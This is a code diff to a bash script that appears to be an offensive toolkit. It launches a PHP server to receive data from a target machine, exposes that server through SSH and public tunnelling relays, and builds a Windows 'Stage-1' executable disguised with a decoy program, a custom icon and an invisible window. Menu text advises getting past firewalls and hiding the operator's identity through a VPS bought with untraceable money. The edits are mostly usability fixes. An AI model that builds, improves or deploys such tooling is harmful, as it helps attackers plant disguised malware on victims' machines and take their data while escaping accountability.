@@ -73,7 +73,7 @@ function setup(){
 
 function launch_server(){
 	default_port="80"
-	echo -e """$yellowb[i]$grey If the target machine has Internet access the port 80 (output connection) is the most likely port not to be blocked by the firewall
+	echo -e """$yellowb[i]$grey If the target machine has an Internet access the port 80 (output connection) is the most likely port not to be blocked by the firewall
 """
 	echo -ne "$blueb[?]$grey Port of PHP Server default($yellow$default_port$grey)"
 	read -p " > " port
@@ -89,11 +89,14 @@ function launch_server(){
 function externalizeHTTPServer(){
 	echo -e """\n$redb Level of Anonymity /3
 
-$white 1) Manualy Open NAT port on the router  $redb 0/3$grey
+$white 1) Localhost only  $redb 0/3$grey
+     Here the data is sent directly to the server hosted inside the local network.
+
+$white 2) Manualy Open NAT port on the router  $redb 0/3$grey
      Here the data is sent directly to the server hosted
      on your network, no anonymity for this use case.
 
-$white 2) Open Public Relays (Remote Port Forwarding)  $redb 1/3$grey
+$white 3) Open Public Relays (Remote Port Forwarding)  $redb 1/3$grey
      Public relays allow port forwarding from a local server
      to a remote host (relay server), so it is not necessary
      to open NAT ports on the router. However, we have no
@@ -102,7 +105,7 @@ $white 2) Open Public Relays (Remote Port Forwarding)  $redb 1/3$grey
      In addition, some public relays only perform redirects for a limited time.
      It is likely that some of these servers are H.S.
 
-$white 3) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
+$white 4) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
      In the event that the redirection server is yours, it must be 
      hosted on an anonymous VPS, that it be purchased with untraceable 
      money, ensure that the service provider is not logging or that the 
@@ -115,6 +118,47 @@ $white 3) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
 
 	case $option in
 		1 ) 
+			nb_loc_ip=$(
+				c=0
+				for i in $(hostname -I) ; do 
+					c=$(($c + 1))
+				done && echo $c
+			)
+
+			if [ $nb_loc_ip -eq 0 ] ; then
+				echo -e "$redb[x]$grey Your are not connected to a network"
+				sleep 1 && externalizeHTTPServer
+			elif [ $nb_loc_ip -eq 1 ] ; then
+				domain_name_relay=$(hostname -I)
+				remoteHTTPserver="http://$domain_name_relay:$port"
+				check_connection
+			else
+				c=0
+				for i in $(hostname -I) ; do
+					tab_ip[$c]="$i"
+					c=$(($c + 1))
+				done
+
+				echo -e
+				for i in $(seq 1 $c) ; do
+					echo -e "$white $i)$grey ${tab_ip[$(($i-1))]}"
+				done
+				echo -e
+				echo -ne "$blueb[?]$grey Local IP address"
+				read -p " > " -n 1 -e ip_index
+				ip_index=$(($ip_index - 1))
+				domain_name_relay=${tab_ip[$ip_index]}
+
+				if [ ! -z "$domain_name_relay" ] ; then
+					remoteHTTPserver="http://$domain_name_relay:$port"
+					check_connection
+				else
+					echo -e "$redb[x]$grey Error no IP specified"
+					sleep 1 && externalizeHTTPServer
+				fi
+			fi
+			;;
+		2 ) 
 			localip=$(hostname -I)
 			echo -e "$yellowb[i]$grey Open port $yellow$port$grey for local IP $yellow$localip$grey on the router"
 			publicip=$(wget -qO- ipinfo.io/ip)
@@ -123,9 +167,9 @@ $white 3) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
 			read -p "Push ENTER to continue"
 			check_connection;;
 
-		2 ) public_relays;;
+		3 ) public_relays;;
 
-		3 ) 
+		4 ) 
 			echo -ne "$blueb[?]$grey SSH Server Username"
 			read -p " > " sshuser
 			echo -ne "$blueb[?]$grey SSH Server IP/Domain Name"
@@ -152,7 +196,7 @@ $white 3) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
 			remoteHTTPserver="http://$domain_name_relay:$port"
 			check_connection;;
 
-		* ) echo -e "Error Syntax" && externalizeHTTPServer;;
+		* ) echo -e "$redb[x]$grey Error Syntax" && externalizeHTTPServer;;
 	esac
 }
 
@@ -179,7 +223,7 @@ $white 8) Back
 	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $port:127.0.0.1:$port serveo.net > sendlink.txt &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\.serveo.net")
@@ -194,10 +238,10 @@ $white 8) Back
 	2 | 02 )
 		echo -e "$greenb[+]$grey Starting SSH Tunneling..."
 	    subdomain=$((RANDOM%${randomness}+999))
-	    $(ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port $subdomain@ssh.localhost.run 2> /dev/null > sendlink.txt) &
+	    gnome-terminal -t "ssh.localhost.run" -x bash -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port $subdomain@ssh.localhost.run > sendlink.txt" 2> /dev/null &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt | grep -o "http://[0-9a-z]*\-[0-9a-z]*\.localhost.run" | sort | uniq)
@@ -221,7 +265,7 @@ $white 8) Back
 	    openport --local-port $port --http-forward --ip-link-protection True > sendlink.txt 2> /dev/null &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress.."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt | grep -e "https://www.openport.io/" | cut -d ' ' -f 14 | cut -d '=' -f 2)
@@ -244,7 +288,7 @@ $white 8) Back
 	    lt -l 127.0.0.1 -p $port > sendlink.txt 2> /dev/null &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt | cut -d ' ' -f 4)
@@ -263,7 +307,7 @@ $white 8) Back
 	    ./loclx-linux-amd64 tunnel http --to 127.0.0.1:$port > sendlink.txt 2> /dev/null &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt | grep -e "https" | cut -d ' ' -f 2)
@@ -282,7 +326,7 @@ $white 8) Back
 	    python2 pagekite.py --clean --signup $port $subdomain.pagekite.me > sendlink.txt 2> /dev/null &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    remoteHTTPserver=$(cat sendlink.txt)
@@ -300,7 +344,7 @@ $white 8) Back
     	./ngrok http $port 1> /dev/null 2>&1 &
 	    c=10 ; for i in $(seq 0 10) ; do
 			sleep 1
-			echo -en "\r $c(s) Connection in pregress..."
+			echo -en "\r $c(s) Connection in progress..."
 			c=$(($c - 1))
 		done ; echo
 	    for i in $(netstat -puntl | grep -e "LISTEN" | grep -e "ngrok" | awk '{print $4}' | cut -d ':' -f 2) ; do	
@@ -320,7 +364,7 @@ $white 8) Back
 		externalizeHTTPServer;;
 
 	* ) 
-		echo -e "Error Syntax" && sleep 1
+		echo -e "$redb[x]$grey Error Syntax" && sleep 1
 		relays;;
 
 	esac
@@ -328,24 +372,27 @@ $white 8) Back
 
 function check_connection(){
 	c=3 ; for i in $(seq 0 3) ; do
+		echo -en "\r$yellowb[i]$grey Test connection in $c(s)"
 		sleep 1
-		echo -en "\r Test connection in $c(s)"
 		c=$(($c - 1))
 	done
 	echo -e ""
 
-	echo -e "$yellowb[i]$grey Test ping on $remoteHTTPserver ...$grey"
+	echo -en "$greenb[+]$grey Test ping on $yellow$remoteHTTPserver$grey...$grey"
 	if httping -c 1 -t 1 $remoteHTTPserver 1> /dev/null ; then
-		echo -e "$greenb[+]$grey OK Ping Success"
+		echo -e "$greenb Success$greey"
 		echo -e "$yellowb[i]$grey The HTTP server is accessible from Internet"
 
-		if [ ! -z "$publicip" ] ; then
+		if [ ! -z "$ip_index" ] ; then
 			diagram 1
-		else
+		elif [ ! -z "$publicip" ] ; then
 			diagram 2
+		else
+			diagram 3
 		fi
 		generate_stage1
 	else
+		echo -e "$greenb Failed$greey"
 		echo -e "$redb[x]$grey Error $yellow$remoteHTTPserver$grey not accessible"
 		echo -e "$yellowb[i]$grey Possible check your firewall or DNS"
 		externalizeHTTPServer
@@ -355,28 +402,40 @@ function check_connection(){
 function diagram(){
 	case $1 in
 		1 ) 
-			echo -e """$yellowb[i]$grey Forwarding configuration
+			echo -e """$yellowb[i]$grey Localhost configuration
 
-Initial PHP Server
-    _____             Router
-   /____/|           _______
-   | -- ||          /______/|
-   |    ||  ----->  |      ||  -----> $blueb INTERNET$grey
-   |   -||          |______|/
-   |____//
-$yellow 0.0.0.0$white:$green$port$grey      $yellow$publicip$white:$green$port$grey
+  Initial PHP Server
+        _____
+       /____/|
+       | -- ||
+       |    ||
+       |   -||
+       |____//
+  $yellow $domain_name_relay$white:$green$port$grey
 """;;
 		2 ) 
 			echo -e """$yellowb[i]$grey Forwarding configuration
 
-Initial PHP Server   Relay Server
-    _____              _____
-   /____/|            /____/|
-   | -- ||            | -- ||
-   |    ||   ----->   |    ||  -----> $blueb INTERNET$grey
-   |   -||            |   -||
-   |____//            |____|/
-$yellow 0.0.0.0$white:$green$port$grey     $yellow$domain_name_relay$publicrelay$white:$green$port$grey
+  Initial PHP Server
+      _____             Router
+     /____/|           _______
+     | -- ||          /______/|
+     |    ||  ----->  |      ||  -----> $blueb INTERNET$grey
+     |   -||          |______|/
+     |____//
+  $yellow 0.0.0.0$white:$green$port$grey      $yellow$publicip$white:$green$port$grey
+""";;
+		3 ) 
+			echo -e """$yellowb[i]$grey Forwarding configuration
+
+  Initial PHP Server   Relay Server
+      _____              _____
+     /____/|            /____/|
+     | -- ||            | -- ||
+     |    ||   ----->   |    ||  -----> $blueb INTERNET$grey
+     |   -||            |   -||
+     |____//            |____|/
+  $yellow 0.0.0.0$white:$green$port$grey     $yellow$domain_name_relay$publicrelay$white:$green$port$grey
 """;;
 
 	esac
@@ -433,7 +492,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 					read -p " > " decoyProgName
 					decoyProgDownload="cls";;
 
-				* ) echo -e "Error Syntax" && sleep 1 && generate_stage1;;
+				* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
 			esac
 
 			echo -ne "$blueb[?]$grey Name of Stage-1 (without spaces)"
@@ -449,7 +508,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 				echo -e "$greenb[+]$grey Copy file $iconStage1Name to output/"
 				cp $iconStage1 $MAIN_PATH/output/
 			else
-				echo -e "Error file does not exist" && sleep 1 && generate_stage1
+				echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
 			fi
 
 			default_iteration="400"
@@ -486,7 +545,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 			i686-w64-mingw32-gcc stage1.c icone.o -o $nameStage1.exe -lws2_32
 
 			echo -e "$yellowb[i]$grey Stage-1 has been created ->$yellow output/$nameStage1.exe$grey"
-			echo -e "$yellowb[i]$grey All information will be send to in$yellow output.log$grey file, please do not remove it"
+			echo -e "$yellowb[i]$grey All information will be send to$yellow output.log$grey file, please do not remove it"
 			exit 0;;
 
 		#Bat to Exe Converter
@@ -495,7 +554,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 				1 ) 
 					echo -e "$yellowb[i]$grey The decoy program will start at execution"
 					echo -e "$grey e.g. (https://www.avast.com/avast.exe)"
-					echo -e "e.g. (https://images.google.com/landscape.jpg)"
+					echo -e " e.g. (https://images.google.com/landscape.jpg)"
 					echo -en "$blueb[?]$grey URL Address of the decoy program"
 					read -p " > " decoyProgDownload
 					uri=$(echo -e "$decoyProgDownload" | cut -d '/' -f 3-)
@@ -515,7 +574,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 				3 ) 
 					echo -e "$grey e.g. $HOME/Programs/avast.exe"
 					echo -e " e.g. /root/Images/landscape.jpg"
-					echo -en "$blueb[?]$grey Specify the absolute path of your decoy program"
+					echo -en "$blueb[?]$grey Specify your decoy program (absolute path)"
 					read -p " > " decoyPath
 					
 					if [ -f $decoyPath ] ; then
@@ -527,12 +586,12 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 						echo -e "$greenb[+]$grey Copy file $decoyProgName to output/"
 						cp $decoyPath $MAIN_PATH/output/
 					else
-						echo -e "Error file does not exist" && sleep 1 && generate_stage1
+						echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
 					fi
 					embedded_prog="1"
 					decoyProgDownload="cls";;
 
-				* ) echo -e "Error Syntax" && sleep 1 && generate_stage1;;
+				* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
 			esac
 
 			echo -ne "$blueb[?]$grey Name of Stage-1 (without spaces)"
@@ -548,7 +607,7 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 				echo -e "$greenb[+]$grey Copy file $iconStage1Name to output/"
 				cp $iconStage1 $MAIN_PATH/output/
 			else
-				echo -e "Error file does not exist" && sleep 1 && generate_stage1
+				echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
 			fi
 
 			cd $MAIN_PATH/output/
@@ -562,24 +621,28 @@ $white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
 │ Open Bat_to_Exe_converter.exe
 │
 │ Convert 'stage1.bat' in '$nameStage1.exe'"""
-if [ "$embedded_prog" -eq 1 ] ; then
+if [ "$embedded_prog" = 1 ] ; then
 	echo -e "│    └─Embed '$decoyProgName'"
+	echo -e "│    └─Extract to: 'AppData'"
 fi
-echo -e """│    └─Icon: '$iconStage1Name'
-│    └─Exe-Format: '64 Bit | Windows (Invisible)'
-│    └─Extract to: 'AppData'
+if [ -f "$iconStage1" ] ; then
+	echo -e "│    └─Icon: '$iconStage1Name'"
+fi
+echo -e """│    └─Exe-Format: '64 Bit | Windows (Invisible)'
 │    └─Include version informations
 └────────────────────────────────────────────────────
 """
-			echo -e "$yellowb[i]$grey -> output/stage1.bat"
-			echo -e "$yellowb[i]$grey -> output/$decoyProgName"
-			if [ "$embedded_prog" -eq 1 ] ; then
-				echo -e "$yellowb[i]$grey -> output/$iconStage1Name"
+			echo -e "$yellowb[i]$grey ->$yellow output/stage1.bat$grey"
+			if [ "$embedded_prog" = 1 ] ; then
+				echo -e "$yellowb[i]$grey ->$yellow output/$decoyProgName$grey"
 			fi
-			echo -e "$yellowb[i]$grey All information will be send to in$yellow output.log$grey file, please do not remove it"
+			if [ -f "$iconStage1" ] ; then
+				echo -e "$yellowb[i]$grey ->$yellow output/$iconStage1Name$grey"
+			fi
+			echo -e "$yellowb[i]$grey All information will be send to$yellow output.log$grey file, please do not remove it"
 			exit 0;;
 
-		* ) echo -e "Error Syntax" && sleep 1 && generate_stage1;;
+		* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
 	esac
 	exit 0
 }
@@ -708,6 +771,6 @@ $grey"""
 		5 ) 
 			rm $MAIN_PATH/sendlink.txt 1> /dev/null 2>&1
 			exit 0;;
-		* ) echo -e "Error Syntax" && sleep 1;;
+		* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1;;
 	esac
 done
